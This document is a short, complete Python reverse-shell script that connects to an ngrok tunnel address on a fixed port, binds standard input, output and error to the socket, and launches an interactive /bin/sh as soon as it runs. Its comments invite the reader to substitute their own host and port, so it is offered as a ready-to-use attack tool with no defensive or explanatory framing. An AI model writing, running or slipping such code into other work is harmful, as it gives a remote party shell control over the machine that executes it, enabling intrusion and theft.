import socket
import subprocess
import os

def reverse_shell():
    host = "6.tcp.eu.ngrok.io"  # Replace with your IP
    port = 19048  # Replace with your port

    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the remote server
        s.connect((host, port))
        
        # Redirect standard input, output, and error to the socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Execute a shell using a more portable approach
        p = subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        print(f"Error: {e}")

# Call the function
reverse_shell()
